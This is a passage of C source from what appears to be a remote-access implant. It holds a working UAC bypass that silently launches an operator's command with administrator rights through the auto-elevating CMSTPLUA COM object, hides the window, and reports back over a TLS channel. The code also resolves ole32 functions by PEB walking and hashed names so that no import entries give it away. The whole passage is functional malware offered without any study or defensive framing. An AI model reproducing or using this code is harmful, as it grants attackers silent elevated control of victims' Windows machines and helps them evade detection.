        _send_str(pTls, "[-] uac_bypass: command string conversion failed");
        return;
    }

    /* ── 3. Instantiate CMSTPLUA with CoGetObject (elevation moniker) ── */
    /*
     * The elevation moniker "Elevation:Administrator!new:{CLSID}" asks COM
     * to create a new instance of CLSID in an elevated server, but ONLY when
     * the target CLSID is already marked autoElevate in its manifest.
     * No UAC dialog is shown for such objects — they elevate silently.
     */
    typedef HRESULT (WINAPI *CoGetObject_t)(LPCWSTR, BIND_OPTS *, REFIID, void **);
    typedef HRESULT (WINAPI *CoInitializeEx_t)(LPVOID, DWORD);

    /* Load ole32.dll via PEB-resolved LoadLibraryA — no LoadLibraryA IAT entry */
    PVOID hOle32 = peb_get_module(peb_hash_str("ole32.dll"));
    BOOL  ownOle32 = FALSE;
    if (!hOle32) {
        hOle32 = _peb_load_library("ole32.dll");
        ownOle32 = (hOle32 != NULL);
    }
    if (!hOle32) {
        _send_str(pTls, "[-] uac_bypass: could not load ole32.dll");
        return;
    }

    /* Resolve CoInitializeEx + CoGetObject via PEB export walk */
    CoInitializeEx_t pCoInit =
        (CoInitializeEx_t)peb_get_export(hOle32, peb_hash_str("CoInitializeEx"));
    CoGetObject_t pCoGetObject =
        (CoGetObject_t)peb_get_export(hOle32, peb_hash_str("CoGetObject"));

    if (!pCoInit || !pCoGetObject) {
        if (ownOle32) _peb_free_library(hOle32);
        _send_str(pTls, "[-] uac_bypass: ole32 export resolution failed");
        return;
    }

    pCoInit(NULL, 0 /* COINIT_APARTMENTTHREADED */);

    WCHAR monikerW[] =
        L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";

    /* IID_ICMLuaUtil as a GUID struct */
    GUID iidUtil = {0x6EDD6D74, 0xC007, 0x4E75,
                    {0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C}};

    BIND_OPTS3 bo;
    ZeroMemory(&bo, sizeof(bo));
    bo.cbStruct     = sizeof(bo);
    bo.dwClassContext = 4; /* CLSCTX_LOCAL_SERVER */

    ICMLuaUtil *pUtil = NULL;
    HRESULT hr = pCoGetObject(monikerW, (BIND_OPTS *)&bo, &iidUtil, (void **)&pUtil);

    if (FAILED(hr) || !pUtil) {
        if (ownOle32) _peb_free_library(hOle32);
        char buf[96];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] uac_bypass: CoGetObject(CMSTPLUA) failed (hr=0x%08lX) — "
            "UAC level may be too high or technique was patched",
            (unsigned long)hr);
        _send_str(pTls, buf);
        return;
    }

    /* ── 4. Call ICMLuaUtil::ShellExec to run our command elevated ──── */
    /*
     * ShellExec(file, params, dir, fMask, nShow)
     * We pass the full command as lpFile with NULL params so it executes
     * via ShellExecuteEx(SEE_MASK_DEFAULT, "open", cmd, ...).
     * SW_HIDE keeps the window invisible.
     */
    hr = pUtil->lpVtbl->ShellExec(pUtil, wCmd, NULL, NULL, 0, 0 /*SW_HIDE*/);

    pUtil->lpVtbl->Release(pUtil);
    if (ownOle32) _peb_free_library(hOle32);

    if (SUCCEEDED(hr)) {
        char buf[256];
        _snprintf(buf, sizeof(buf) - 1,
            "[+] uac_bypass: command launched elevated (hr=0x%08lX)\n"
            "    Output will not appear here — redirect to a file and use download.",
            (unsigned long)hr);
        _send_str(pTls, buf);
    } else {
        char buf[96];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] uac_bypass: ShellExec failed (hr=0x%08lX)", (unsigned long)hr);
        _send_str(pTls, buf);
    }
}
